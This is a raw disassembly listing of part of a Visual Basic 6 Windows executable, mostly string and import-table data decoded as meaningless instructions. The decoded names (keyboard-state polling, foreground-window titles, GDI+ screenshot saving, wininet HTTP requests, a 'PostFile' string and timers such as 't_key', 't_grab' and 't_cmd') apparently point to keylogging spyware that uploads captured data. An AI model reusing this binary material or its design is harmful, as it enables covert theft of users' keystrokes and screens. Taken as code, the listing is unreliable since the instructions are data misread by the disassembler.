  4027a5:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4027a8:	73 6f                	jae    0x402819
  4027aa:	66 74 20             	data16 je 0x4027cd
  4027ad:	56                   	push   %esi
  4027ae:	69 73 75 61 6c 20 53 	imul   $0x53206c61,0x75(%ebx),%esi
  4027b5:	74 75                	je     0x40282c
  4027b7:	64 69 6f 5c 56 42 39 	imul   $0x38394256,%fs:0x5c(%edi),%ebp
  4027be:	38 
  4027bf:	5c                   	pop    %esp
  4027c0:	56                   	push   %esi
  4027c1:	42                   	inc    %edx
  4027c2:	36 2e 4f             	ss cs dec %edi
  4027c5:	4c                   	dec    %esp
  4027c6:	42                   	inc    %edx
  4027c7:	00 56 42             	add    %dl,0x42(%esi)
  4027ca:	00 00                	add    %al,(%eax)
  4027cc:	7c 27                	jl     0x4027f5
  4027ce:	40                   	inc    %eax
  4027cf:	00 00                	add    %al,(%eax)
  4027d1:	00 00                	add    %al,(%eax)
  4027d3:	00 06                	add    %al,(%esi)
  4027d5:	00 00                	add    %al,(%eax)
  4027d7:	00 09                	add    %cl,(%ecx)
  4027d9:	00 00                	add    %al,(%eax)
  4027db:	00 8c 27 40 00 c8 27 	add    %cl,0x27c80040(%edi,%eiz,1)
  4027e2:	40                   	inc    %eax
  4027e3:	00 d0                	add    %dl,%al
  4027e5:	a2 40 00 00 00       	mov    %al,0x40
  4027ea:	00 00                	add    %al,(%eax)
  4027ec:	00 00                	add    %al,(%eax)
  4027ee:	00 00                	add    %al,(%eax)
  4027f0:	e8 cc ad 00 2a       	call   0x2a40d5c1
  4027f5:	4f                   	dec    %edi
  4027f6:	ad                   	lods   %ds:(%esi),%eax
  4027f7:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  4027fd:	0c 00                	or     $0x0,%al
  4027ff:	aa                   	stos   %al,%es:(%edi)
  402800:	00 60 d3             	add    %ah,-0x2d(%eax)
  402803:	93                   	xchg   %eax,%ebx
  402804:	74 5f                	je     0x402865
  402806:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  40280a:	00 00                	add    %al,(%eax)
  40280c:	da 4e ad             	fimull -0x53(%esi)
  40280f:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402815:	0c 00                	or     $0x0,%al
  402817:	aa                   	stos   %al,%es:(%edi)
  402818:	00 60 d3             	add    %ah,-0x2d(%eax)
  40281b:	93                   	xchg   %eax,%ebx
  40281c:	6c                   	insb   (%dx),%es:(%edi)
  40281d:	62 6c 43 4f          	bound  %ebp,0x4f(%ebx,%eax,2)
  402821:	4e                   	dec    %esi
  402822:	54                   	push   %esp
  402823:	00 74 5f 73          	add    %dh,0x73(%edi,%ebx,2)
  402827:	61                   	popa
  402828:	76 65                	jbe    0x40288f
  40282a:	00 00                	add    %al,(%eax)
  40282c:	3a 4f ad             	cmp    -0x53(%edi),%cl
  40282f:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402835:	0c 00                	or     $0x0,%al
  402837:	aa                   	stos   %al,%es:(%edi)
  402838:	00 60 d3             	add    %ah,-0x2d(%eax)
  40283b:	93                   	xchg   %eax,%ebx
  40283c:	46                   	inc    %esi
  40283d:	6f                   	outsl  %ds:(%esi),(%dx)
  40283e:	72 6d                	jb     0x4028ad
  402840:	00 00                	add    %al,(%eax)
  402842:	00 00                	add    %al,(%eax)
  402844:	74 5f                	je     0x4028a5
  402846:	67 72 61             	addr16 jb 0x4028aa
  402849:	62 00                	bound  %eax,(%eax)
  40284b:	00 74 5f 63          	add    %dh,0x63(%edi,%ebx,2)
  40284f:	6d                   	insl   (%dx),%es:(%edi)
  402850:	64 00 00             	add    %al,%fs:(%eax)
  402853:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402856:	10 00                	adc    %al,(%eax)
  402858:	00 00                	add    %al,(%eax)
  40285a:	00 00                	add    %al,(%eax)
  40285c:	10 00                	adc    %al,(%eax)
  40285e:	04 04                	add    $0x4,%al
  402860:	0c 00                	or     $0x0,%al
  402862:	1c 00                	sbb    $0x0,%al
  402864:	00 00                	add    %al,(%eax)
  402866:	00 00                	add    %al,(%eax)
  402868:	1c 00                	sbb    $0x0,%al
  40286a:	04 04                	add    $0x4,%al
  40286c:	0c 00                	or     $0x0,%al
  40286e:	20 00                	and    %al,(%eax)
  402870:	00 00                	add    %al,(%eax)
  402872:	00 00                	add    %al,(%eax)
  402874:	20 00                	and    %al,(%eax)
  402876:	04 04                	add    $0x4,%al
  402878:	08 00                	or     %al,(%eax)
  40287a:	00 00                	add    %al,(%eax)
  40287c:	47                   	inc    %edi
  40287d:	44                   	inc    %esp
  40287e:	49                   	dec    %ecx
  40287f:	50                   	push   %eax
  402880:	6c                   	insb   (%dx),%es:(%edi)
  402881:	75 73                	jne    0x4028f6
  402883:	00 0f                	add    %cl,(%edi)
  402885:	00 00                	add    %al,(%eax)
  402887:	00 47 64             	add    %al,0x64(%edi)
  40288a:	69 70 6c 75 73 53 74 	imul   $0x74537375,0x6c(%eax),%esi
  402891:	61                   	popa
  402892:	72 74                	jb     0x402908
  402894:	75 70                	jne    0x402906
  402896:	00 00                	add    %al,(%eax)
  402898:	7c 28                	jl     0x4028c2
  40289a:	40                   	inc    %eax
  40289b:	00 88 28 40 00 00    	add    %cl,0x4028(%eax)
  4028a1:	00 04 00             	add    %al,(%eax,%eax,1)
  4028a4:	d4 a2                	aam    $0xa2
  4028a6:	40                   	inc    %eax
	...
  4028af:	00 a1 dc a2 40 00    	add    %ah,0x40a2dc(%ecx)
  4028b5:	0b c0                	or     %eax,%eax
  4028b7:	74 02                	je     0x4028bb
  4028b9:	ff e0                	jmp    *%eax
  4028bb:	68 98 28 40 00       	push   $0x402898
  4028c0:	b8 30 15 40 00       	mov    $0x401530,%eax
  4028c5:	ff d0                	call   *%eax
  4028c7:	ff e0                	jmp    *%eax
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 10                	add    %dl,(%eax)
  4028cd:	00 00                	add    %al,(%eax)
  4028cf:	00 47 64             	add    %al,0x64(%edi)
  4028d2:	69 70 6c 75 73 53 68 	imul   $0x68537375,0x6c(%eax),%esi
  4028d9:	75 74                	jne    0x40294f
  4028db:	64 6f                	outsl  %fs:(%esi),(%dx)
  4028dd:	77 6e                	ja     0x40294d
  4028df:	00 7c 28 40          	add    %bh,0x40(%eax,%ebp,1)
  4028e3:	00 d0                	add    %dl,%al
  4028e5:	28 40 00             	sub    %al,0x0(%eax)
  4028e8:	00 00                	add    %al,(%eax)
  4028ea:	04 00                	add    $0x0,%al
  4028ec:	e0 a2                	loopne 0x402890
  4028ee:	40                   	inc    %eax
	...
  4028f7:	00 a1 e8 a2 40 00    	add    %ah,0x40a2e8(%ecx)
  4028fd:	0b c0                	or     %eax,%eax
  4028ff:	74 02                	je     0x402903
  402901:	ff e0                	jmp    *%eax
  402903:	68 e0 28 40 00       	push   $0x4028e0
  402908:	b8 30 15 40 00       	mov    $0x401530,%eax
  40290d:	ff d0                	call   *%eax
  40290f:	ff e0                	jmp    *%eax
  402911:	00 00                	add    %al,(%eax)
  402913:	00 1c 00             	add    %bl,(%eax,%eax,1)
  402916:	00 00                	add    %al,(%eax)
  402918:	47                   	inc    %edi
  402919:	64 69 70 43 72 65 61 	imul   $0x74616572,%fs:0x43(%eax),%esi
  402920:	74 
  402921:	65 42                	gs inc %edx
  402923:	69 74 6d 61 70 46 72 	imul   $0x6f724670,0x61(%ebp,%ebp,2),%esi
  40292a:	6f 
  40292b:	6d                   	insl   (%dx),%es:(%edi)
  40292c:	48                   	dec    %eax
  40292d:	42                   	inc    %edx
  40292e:	49                   	dec    %ecx
  40292f:	54                   	push   %esp
  402930:	4d                   	dec    %ebp
  402931:	41                   	inc    %ecx
  402932:	50                   	push   %eax
  402933:	00 00                	add    %al,(%eax)
  402935:	00 00                	add    %al,(%eax)
  402937:	00 7c 28 40          	add    %bh,0x40(%eax,%ebp,1)
  40293b:	00 18                	add    %bl,(%eax)
  40293d:	29 40 00             	sub    %eax,0x0(%eax)
  402940:	00 00                	add    %al,(%eax)
  402942:	04 00                	add    $0x0,%al
  402944:	ec                   	in     (%dx),%al
  402945:	a2 40 00 00 00       	mov    %al,0x40
  40294a:	00 00                	add    %al,(%eax)
  40294c:	00 00                	add    %al,(%eax)
  40294e:	00 00                	add    %al,(%eax)
  402950:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  402955:	0b c0                	or     %eax,%eax
  402957:	74 02                	je     0x40295b
  402959:	ff e0                	jmp    *%eax
  40295b:	68 38 29 40 00       	push   $0x402938
  402960:	b8 30 15 40 00       	mov    $0x401530,%eax
  402965:	ff d0                	call   *%eax
  402967:	ff e0                	jmp    *%eax
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 11                	add    %dl,(%ecx)
  40296d:	00 00                	add    %al,(%eax)
  40296f:	00 47 64             	add    %al,0x64(%edi)
  402972:	69 70 44 69 73 70 6f 	imul   $0x6f707369,0x44(%eax),%esi
  402979:	73 65                	jae    0x4029e0
  40297b:	49                   	dec    %ecx
  40297c:	6d                   	insl   (%dx),%es:(%edi)
  40297d:	61                   	popa
  40297e:	67 65 00 00          	add    %al,%gs:(%bx,%si)
  402982:	00 00                	add    %al,(%eax)
  402984:	7c 28                	jl     0x4029ae
  402986:	40                   	inc    %eax
  402987:	00 70 29             	add    %dh,0x29(%eax)
  40298a:	40                   	inc    %eax
  40298b:	00 00                	add    %al,(%eax)
  40298d:	00 04 00             	add    %al,(%eax,%eax,1)
  402990:	f8                   	clc
  402991:	a2 40 00 00 00       	mov    %al,0x40
  402996:	00 00                	add    %al,(%eax)
  402998:	00 00                	add    %al,(%eax)
  40299a:	00 00                	add    %al,(%eax)
  40299c:	a1 00 a3 40 00       	mov    0x40a300,%eax
  4029a1:	0b c0                	or     %eax,%eax
  4029a3:	74 02                	je     0x4029a7
  4029a5:	ff e0                	jmp    *%eax
  4029a7:	68 84 29 40 00       	push   $0x402984
  4029ac:	b8 30 15 40 00       	mov    $0x401530,%eax
  4029b1:	ff d0                	call   *%eax
  4029b3:	ff e0                	jmp    *%eax
  4029b5:	00 00                	add    %al,(%eax)
  4029b7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4029ba:	00 00                	add    %al,(%eax)
  4029bc:	47                   	inc    %edi
  4029bd:	64 69 70 53 61 76 65 	imul   $0x49657661,%fs:0x53(%eax),%esi
  4029c4:	49 
  4029c5:	6d                   	insl   (%dx),%es:(%edi)
  4029c6:	61                   	popa
  4029c7:	67 65 54             	addr16 gs push %esp
  4029ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4029cb:	46                   	inc    %esi
  4029cc:	69 6c 65 00 7c 28 40 	imul   $0x40287c,0x0(%ebp,%eiz,2),%ebp
  4029d3:	00 
  4029d4:	bc 29 40 00 00       	mov    $0x4029,%esp
  4029d9:	00 04 00             	add    %al,(%eax,%eax,1)
  4029dc:	04 a3                	add    $0xa3,%al
  4029de:	40                   	inc    %eax
	...
  4029e7:	00 a1 0c a3 40 00    	add    %ah,0x40a30c(%ecx)
  4029ed:	0b c0                	or     %eax,%eax
  4029ef:	74 02                	je     0x4029f3
  4029f1:	ff e0                	jmp    *%eax
  4029f3:	68 d0 29 40 00       	push   $0x4029d0
  4029f8:	b8 30 15 40 00       	mov    $0x401530,%eax
  4029fd:	ff d0                	call   *%eax
  4029ff:	ff e0                	jmp    *%eax
  402a01:	00 00                	add    %al,(%eax)
  402a03:	00 06                	add    %al,(%esi)
  402a05:	00 00                	add    %al,(%eax)
  402a07:	00 6f 6c             	add    %ch,0x6c(%edi)
  402a0a:	65 33 32             	xor    %gs:(%edx),%esi
  402a0d:	00 00                	add    %al,(%eax)
  402a0f:	00 10                	add    %dl,(%eax)
  402a11:	00 00                	add    %al,(%eax)
  402a13:	00 43 4c             	add    %al,0x4c(%ebx)
  402a16:	53                   	push   %ebx
  402a17:	49                   	dec    %ecx
  402a18:	44                   	inc    %esp
  402a19:	46                   	inc    %esi
  402a1a:	72 6f                	jb     0x402a8b
  402a1c:	6d                   	insl   (%dx),%es:(%edi)
  402a1d:	53                   	push   %ebx
  402a1e:	74 72                	je     0x402a92
  402a20:	69 6e 67 00 08 2a 40 	imul   $0x402a0800,0x67(%esi),%ebp
  402a27:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  402a2a:	40                   	inc    %eax
  402a2b:	00 00                	add    %al,(%eax)
  402a2d:	00 04 00             	add    %al,(%eax,%eax,1)
  402a30:	10 a3 40 00 00 00    	adc    %ah,0x40(%ebx)
  402a36:	00 00                	add    %al,(%eax)
  402a38:	00 00                	add    %al,(%eax)
  402a3a:	00 00                	add    %al,(%eax)
  402a3c:	a1 18 a3 40 00       	mov    0x40a318,%eax
  402a41:	0b c0                	or     %eax,%eax
  402a43:	74 02                	je     0x402a47
  402a45:	ff e0                	jmp    *%eax
  402a47:	68 24 2a 40 00       	push   $0x402a24
  402a4c:	b8 30 15 40 00       	mov    $0x401530,%eax
  402a51:	ff d0                	call   *%eax
  402a53:	ff e0                	jmp    *%eax
  402a55:	00 00                	add    %al,(%eax)
  402a57:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402a5a:	00 00                	add    %al,(%eax)
  402a5c:	77 69                	ja     0x402ac7
  402a5e:	6e                   	outsb  %ds:(%esi),(%dx)
  402a5f:	69 6e 65 74 2e 64 6c 	imul   $0x6c642e74,0x65(%esi),%ebp
  402a66:	6c                   	insb   (%dx),%es:(%edi)
  402a67:	00 0e                	add    %cl,(%esi)
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 49 6e             	add    %cl,0x6e(%ecx)
  402a6e:	74 65                	je     0x402ad5
  402a70:	72 6e                	jb     0x402ae0
  402a72:	65 74 4f             	gs je  0x402ac4
  402a75:	70 65                	jo     0x402adc
  402a77:	6e                   	outsb  %ds:(%esi),(%dx)
  402a78:	41                   	inc    %ecx
  402a79:	00 00                	add    %al,(%eax)
  402a7b:	00 5c 2a 40          	add    %bl,0x40(%edx,%ebp,1)
  402a7f:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  402a83:	00 00                	add    %al,(%eax)
  402a85:	00 04 00             	add    %al,(%eax,%eax,1)
  402a88:	1c a3                	sbb    $0xa3,%al
  402a8a:	40                   	inc    %eax
	...
  402a93:	00 a1 24 a3 40 00    	add    %ah,0x40a324(%ecx)
  402a99:	0b c0                	or     %eax,%eax
  402a9b:	74 02                	je     0x402a9f
  402a9d:	ff e0                	jmp    *%eax
  402a9f:	68 7c 2a 40 00       	push   $0x402a7c
  402aa4:	b8 30 15 40 00       	mov    $0x401530,%eax
  402aa9:	ff d0                	call   *%eax
  402aab:	ff e0                	jmp    *%eax
  402aad:	00 00                	add    %al,(%eax)
  402aaf:	00 11                	add    %dl,(%ecx)
  402ab1:	00 00                	add    %al,(%eax)
  402ab3:	00 49 6e             	add    %cl,0x6e(%ecx)
  402ab6:	74 65                	je     0x402b1d
  402ab8:	72 6e                	jb     0x402b28
  402aba:	65 74 43             	gs je  0x402b00
  402abd:	6f                   	outsl  %ds:(%esi),(%dx)
  402abe:	6e                   	outsb  %ds:(%esi),(%dx)
  402abf:	6e                   	outsb  %ds:(%esi),(%dx)
  402ac0:	65 63 74 41 00       	arpl   %esi,%gs:0x0(%ecx,%eax,2)
  402ac5:	00 00                	add    %al,(%eax)
  402ac7:	00 5c 2a 40          	add    %bl,0x40(%edx,%ebp,1)
  402acb:	00 b4 2a 40 00 00 00 	add    %dh,0x40(%edx,%ebp,1)
  402ad2:	04 00                	add    $0x0,%al
  402ad4:	28 a3 40 00 00 00    	sub    %ah,0x40(%ebx)
  402ada:	00 00                	add    %al,(%eax)
  402adc:	00 00                	add    %al,(%eax)
  402ade:	00 00                	add    %al,(%eax)
  402ae0:	a1 30 a3 40 00       	mov    0x40a330,%eax
  402ae5:	0b c0                	or     %eax,%eax
  402ae7:	74 02                	je     0x402aeb
  402ae9:	ff e0                	jmp    *%eax
  402aeb:	68 c8 2a 40 00       	push   $0x402ac8
  402af0:	b8 30 15 40 00       	mov    $0x401530,%eax
  402af5:	ff d0                	call   *%eax
  402af7:	ff e0                	jmp    *%eax
  402af9:	00 00                	add    %al,(%eax)
  402afb:	00 11                	add    %dl,(%ecx)
  402afd:	00 00                	add    %al,(%eax)
  402aff:	00 49 6e             	add    %cl,0x6e(%ecx)
  402b02:	74 65                	je     0x402b69
  402b04:	72 6e                	jb     0x402b74
  402b06:	65 74 52             	gs je  0x402b5b
  402b09:	65 61                	gs popa
  402b0b:	64 46                	fs inc %esi
  402b0d:	69 6c 65 00 00 00 00 	imul   $0x5c000000,0x0(%ebp,%eiz,2),%ebp
  402b14:	5c 
  402b15:	2a 40 00             	sub    0x0(%eax),%al
  402b18:	00 2b                	add    %ch,(%ebx)
  402b1a:	40                   	inc    %eax
  402b1b:	00 00                	add    %al,(%eax)
  402b1d:	00 04 00             	add    %al,(%eax,%eax,1)
  402b20:	34 a3                	xor    $0xa3,%al
  402b22:	40                   	inc    %eax
	...
  402b2b:	00 a1 3c a3 40 00    	add    %ah,0x40a33c(%ecx)
  402b31:	0b c0                	or     %eax,%eax
  402b33:	74 02                	je     0x402b37
  402b35:	ff e0                	jmp    *%eax
  402b37:	68 14 2b 40 00       	push   $0x402b14
  402b3c:	b8 30 15 40 00       	mov    $0x401530,%eax
  402b41:	ff d0                	call   *%eax
  402b43:	ff e0                	jmp    *%eax
  402b45:	00 00                	add    %al,(%eax)
  402b47:	00 11                	add    %dl,(%ecx)
  402b49:	00 00                	add    %al,(%eax)
  402b4b:	00 48 74             	add    %cl,0x74(%eax)
  402b4e:	74 70                	je     0x402bc0
  402b50:	4f                   	dec    %edi
  402b51:	70 65                	jo     0x402bb8
  402b53:	6e                   	outsb  %ds:(%esi),(%dx)
  402b54:	52                   	push   %edx
  402b55:	65 71 75             	gs jno 0x402bcd
  402b58:	65 73 74             	gs jae 0x402bcf
  402b5b:	41                   	inc    %ecx
  402b5c:	00 00                	add    %al,(%eax)
  402b5e:	00 00                	add    %al,(%eax)
  402b60:	5c                   	pop    %esp
  402b61:	2a 40 00             	sub    0x0(%eax),%al
  402b64:	4c                   	dec    %esp
  402b65:	2b 40 00             	sub    0x0(%eax),%eax
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	04 00                	add    $0x0,%al
  402b6c:	40                   	inc    %eax
  402b6d:	a3 40 00 00 00       	mov    %eax,0x40
  402b72:	00 00                	add    %al,(%eax)
  402b74:	00 00                	add    %al,(%eax)
  402b76:	00 00                	add    %al,(%eax)
  402b78:	a1 48 a3 40 00       	mov    0x40a348,%eax
  402b7d:	0b c0                	or     %eax,%eax
  402b7f:	74 02                	je     0x402b83
  402b81:	ff e0                	jmp    *%eax
  402b83:	68 60 2b 40 00       	push   $0x402b60
  402b88:	b8 30 15 40 00       	mov    $0x401530,%eax
  402b8d:	ff d0                	call   *%eax
  402b8f:	ff e0                	jmp    *%eax
  402b91:	00 00                	add    %al,(%eax)
  402b93:	00 11                	add    %dl,(%ecx)
  402b95:	00 00                	add    %al,(%eax)
  402b97:	00 48 74             	add    %cl,0x74(%eax)
  402b9a:	74 70                	je     0x402c0c
  402b9c:	53                   	push   %ebx
  402b9d:	65 6e                	outsb  %gs:(%esi),(%dx)
  402b9f:	64 52                	fs push %edx
  402ba1:	65 71 75             	gs jno 0x402c19
  402ba4:	65 73 74             	gs jae 0x402c1b
  402ba7:	41                   	inc    %ecx
  402ba8:	00 00                	add    %al,(%eax)
  402baa:	00 00                	add    %al,(%eax)
  402bac:	5c                   	pop    %esp
  402bad:	2a 40 00             	sub    0x0(%eax),%al
  402bb0:	98                   	cwtl
  402bb1:	2b 40 00             	sub    0x0(%eax),%eax
  402bb4:	00 00                	add    %al,(%eax)
  402bb6:	04 00                	add    $0x0,%al
  402bb8:	4c                   	dec    %esp
  402bb9:	a3 40 00 00 00       	mov    %eax,0x40
  402bbe:	00 00                	add    %al,(%eax)
  402bc0:	00 00                	add    %al,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	a1 54 a3 40 00       	mov    0x40a354,%eax
  402bc9:	0b c0                	or     %eax,%eax
  402bcb:	74 02                	je     0x402bcf
  402bcd:	ff e0                	jmp    *%eax
  402bcf:	68 ac 2b 40 00       	push   $0x402bac
  402bd4:	b8 30 15 40 00       	mov    $0x401530,%eax
  402bd9:	ff d0                	call   *%eax
  402bdb:	ff e0                	jmp    *%eax
  402bdd:	00 00                	add    %al,(%eax)
  402bdf:	00 14 00             	add    %dl,(%eax,%eax,1)
  402be2:	00 00                	add    %al,(%eax)
  402be4:	49                   	dec    %ecx
  402be5:	6e                   	outsb  %ds:(%esi),(%dx)
  402be6:	74 65                	je     0x402c4d
  402be8:	72 6e                	jb     0x402c58
  402bea:	65 74 43             	gs je  0x402c30
  402bed:	6c                   	insb   (%dx),%es:(%edi)
  402bee:	6f                   	outsl  %ds:(%esi),(%dx)
  402bef:	73 65                	jae    0x402c56
  402bf1:	48                   	dec    %eax
  402bf2:	61                   	popa
  402bf3:	6e                   	outsb  %ds:(%esi),(%dx)
  402bf4:	64 6c                	fs insb (%dx),%es:(%edi)
  402bf6:	65 00 5c 2a 40       	add    %bl,%gs:0x40(%edx,%ebp,1)
  402bfb:	00 e4                	add    %ah,%ah
  402bfd:	2b 40 00             	sub    0x0(%eax),%eax
  402c00:	00 00                	add    %al,(%eax)
  402c02:	04 00                	add    $0x0,%al
  402c04:	58                   	pop    %eax
  402c05:	a3 40 00 00 00       	mov    %eax,0x40
  402c0a:	00 00                	add    %al,(%eax)
  402c0c:	00 00                	add    %al,(%eax)
  402c0e:	00 00                	add    %al,(%eax)
  402c10:	a1 60 a3 40 00       	mov    0x40a360,%eax
  402c15:	0b c0                	or     %eax,%eax
  402c17:	74 02                	je     0x402c1b
  402c19:	ff e0                	jmp    *%eax
  402c1b:	68 f8 2b 40 00       	push   $0x402bf8
  402c20:	b8 30 15 40 00       	mov    $0x401530,%eax
  402c25:	ff d0                	call   *%eax
  402c27:	ff e0                	jmp    *%eax
  402c29:	00 00                	add    %al,(%eax)
  402c2b:	00 17                	add    %dl,(%edi)
  402c2d:	00 00                	add    %al,(%eax)
  402c2f:	00 48 74             	add    %cl,0x74(%eax)
  402c32:	74 70                	je     0x402ca4
  402c34:	41                   	inc    %ecx
  402c35:	64 64 52             	fs fs push %edx
  402c38:	65 71 75             	gs jno 0x402cb0
  402c3b:	65 73 74             	gs jae 0x402cb2
  402c3e:	48                   	dec    %eax
  402c3f:	65 61                	gs popa
  402c41:	64 65 72 73          	fs gs jb 0x402cb8
  402c45:	41                   	inc    %ecx
  402c46:	00 00                	add    %al,(%eax)
  402c48:	5c                   	pop    %esp
  402c49:	2a 40 00             	sub    0x0(%eax),%al
  402c4c:	30 2c 40             	xor    %ch,(%eax,%eax,2)
  402c4f:	00 00                	add    %al,(%eax)
  402c51:	00 04 00             	add    %al,(%eax,%eax,1)
  402c54:	64 a3 40 00 00 00    	mov    %eax,%fs:0x40
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	00 00                	add    %al,(%eax)
  402c5e:	00 00                	add    %al,(%eax)
  402c60:	a1 6c a3 40 00       	mov    0x40a36c,%eax
  402c65:	0b c0                	or     %eax,%eax
  402c67:	74 02                	je     0x402c6b
  402c69:	ff e0                	jmp    *%eax
  402c6b:	68 48 2c 40 00       	push   $0x402c48
  402c70:	b8 30 15 40 00       	mov    $0x401530,%eax
  402c75:	ff d0                	call   *%eax
  402c77:	ff e0                	jmp    *%eax
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 08                	add    %cl,(%eax)
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 77 69             	add    %dh,0x69(%edi)
  402c82:	6e                   	outsb  %ds:(%esi),(%dx)
  402c83:	69 6e 65 74 00 11 00 	imul   $0x110074,0x65(%esi),%ebp
  402c8a:	00 00                	add    %al,(%eax)
  402c8c:	49                   	dec    %ecx
  402c8d:	6e                   	outsb  %ds:(%esi),(%dx)
  402c8e:	74 65                	je     0x402cf5
  402c90:	72 6e                	jb     0x402d00
  402c92:	65 74 4f             	gs je  0x402ce4
  402c95:	70 65                	jo     0x402cfc
  402c97:	6e                   	outsb  %ds:(%esi),(%dx)
  402c98:	55                   	push   %ebp
  402c99:	72 6c                	jb     0x402d07
  402c9b:	41                   	inc    %ecx
  402c9c:	00 00                	add    %al,(%eax)
  402c9e:	00 00                	add    %al,(%eax)
  402ca0:	50                   	push   %eax
  402ca1:	6f                   	outsl  %ds:(%esi),(%dx)
  402ca2:	73 74                	jae    0x402d18
  402ca4:	46                   	inc    %esi
  402ca5:	69 6c 65 00 00 00 00 	imul   $0x14000000,0x0(%ebp,%eiz,2),%ebp
  402cac:	14 
  402cad:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  402cb1:	00 02                	add    %al,(%edx)
  402cb3:	00 00                	add    %al,(%eax)
  402cb5:	00 00                	add    %al,(%eax)
  402cb7:	00 38                	add    %bh,(%eax)
  402cb9:	00 01                	add    %al,(%ecx)
  402cbb:	00 3c 00             	add    %bh,(%eax,%eax,1)
  402cbe:	01 00                	add    %eax,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	80 2c 40 00          	subb   $0x0,(%eax,%eax,2)
  402cc8:	8c 2c 40             	mov    %gs,(%eax,%eax,2)
  402ccb:	00 00                	add    %al,(%eax)
  402ccd:	00 04 00             	add    %al,(%eax,%eax,1)
  402cd0:	70 a3                	jo     0x402c75
  402cd2:	40                   	inc    %eax
	...
  402cdb:	00 a1 78 a3 40 00    	add    %ah,0x40a378(%ecx)
  402ce1:	0b c0                	or     %eax,%eax
  402ce3:	74 02                	je     0x402ce7
  402ce5:	ff e0                	jmp    *%eax
  402ce7:	68 c4 2c 40 00       	push   $0x402cc4
  402cec:	b8 30 15 40 00       	mov    $0x401530,%eax
  402cf1:	ff d0                	call   *%eax
  402cf3:	ff e0                	jmp    *%eax
  402cf5:	00 00                	add    %al,(%eax)
  402cf7:	00 07                	add    %al,(%edi)
  402cf9:	00 00                	add    %al,(%eax)
  402cfb:	00 75 73             	add    %dh,0x73(%ebp)
  402cfe:	65 72 33             	gs jb  0x402d34
  402d01:	32 00                	xor    (%eax),%al
  402d03:	00 11                	add    %dl,(%ecx)
  402d05:	00 00                	add    %al,(%eax)
  402d07:	00 47 65             	add    %al,0x65(%edi)
  402d0a:	74 41                	je     0x402d4d
  402d0c:	73 79                	jae    0x402d87
  402d0e:	6e                   	outsb  %ds:(%esi),(%dx)
  402d0f:	63 4b 65             	arpl   %ecx,0x65(%ebx)
  402d12:	79 53                	jns    0x402d67
  402d14:	74 61                	je     0x402d77
  402d16:	74 65                	je     0x402d7d
  402d18:	00 00                	add    %al,(%eax)
  402d1a:	00 00                	add    %al,(%eax)
  402d1c:	fc                   	cld
  402d1d:	2c 40                	sub    $0x40,%al
  402d1f:	00 08                	add    %cl,(%eax)
  402d21:	2d 40 00 00 00       	sub    $0x40,%eax
  402d26:	04 00                	add    $0x0,%al
  402d28:	7c a3                	jl     0x402ccd
  402d2a:	40                   	inc    %eax
	...
  402d33:	00 a1 84 a3 40 00    	add    %ah,0x40a384(%ecx)
  402d39:	0b c0                	or     %eax,%eax
  402d3b:	74 02                	je     0x402d3f
  402d3d:	ff e0                	jmp    *%eax
  402d3f:	68 1c 2d 40 00       	push   $0x402d1c
  402d44:	b8 30 15 40 00       	mov    $0x401530,%eax
  402d49:	ff d0                	call   *%eax
  402d4b:	ff e0                	jmp    *%eax
  402d4d:	00 00                	add    %al,(%eax)
  402d4f:	00 14 00             	add    %dl,(%eax,%eax,1)
  402d52:	00 00                	add    %al,(%eax)
  402d54:	47                   	inc    %edi
  402d55:	65 74 46             	gs je  0x402d9e
  402d58:	6f                   	outsl  %ds:(%esi),(%dx)
  402d59:	72 65                	jb     0x402dc0
  402d5b:	67 72 6f             	addr16 jb 0x402dcd
  402d5e:	75 6e                	jne    0x402dce
  402d60:	64 57                	fs push %edi
  402d62:	69 6e 64 6f 77 00 fc 	imul   $0xfc00776f,0x64(%esi),%ebp
  402d69:	2c 40                	sub    $0x40,%al
  402d6b:	00 54 2d 40          	add    %dl,0x40(%ebp,%ebp,1)
  402d6f:	00 00                	add    %al,(%eax)
  402d71:	00 04 00             	add    %al,(%eax,%eax,1)
  402d74:	88 a3 40 00 00 00    	mov    %ah,0x40(%ebx)
  402d7a:	00 00                	add    %al,(%eax)
  402d7c:	00 00                	add    %al,(%eax)
  402d7e:	00 00                	add    %al,(%eax)
  402d80:	a1 90 a3 40 00       	mov    0x40a390,%eax
  402d85:	0b c0                	or     %eax,%eax
  402d87:	74 02                	je     0x402d8b
  402d89:	ff e0                	jmp    *%eax
  402d8b:	68 68 2d 40 00       	push   $0x402d68
  402d90:	b8 30 15 40 00       	mov    $0x401530,%eax
  402d95:	ff d0                	call   *%eax
  402d97:	ff e0                	jmp    *%eax
  402d99:	00 00                	add    %al,(%eax)
  402d9b:	00 0f                	add    %cl,(%edi)
  402d9d:	00 00                	add    %al,(%eax)
  402d9f:	00 47 65             	add    %al,0x65(%edi)
  402da2:	74 57                	je     0x402dfb
  402da4:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  402dab:	78 74                	js     0x402e21
  402dad:	41                   	inc    %ecx
  402dae:	00 00                	add    %al,(%eax)
  402db0:	fc                   	cld
  402db1:	2c 40                	sub    $0x40,%al
  402db3:	00 a0 2d 40 00 00    	add    %ah,0x402d(%eax)
  402db9:	00 04 00             	add    %al,(%eax,%eax,1)
  402dbc:	94                   	xchg   %eax,%esp
